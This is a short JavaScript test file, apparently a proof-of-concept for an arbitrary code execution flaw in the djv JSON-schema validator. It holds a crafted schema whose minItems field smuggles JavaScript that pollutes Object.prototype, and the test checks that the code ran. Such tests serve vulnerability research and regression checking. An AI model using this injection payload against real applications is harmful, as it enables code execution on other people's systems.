test("Arbitrary code execution in  djv", () => {
  expect.assertions(2);
  const djv = require("djv");
  expect({}.polluted).toBe(undefined);
  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}'
    );
    env.addSchema("test", evilSchema);
    env.validate("test#/common", { type: "custom" });
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
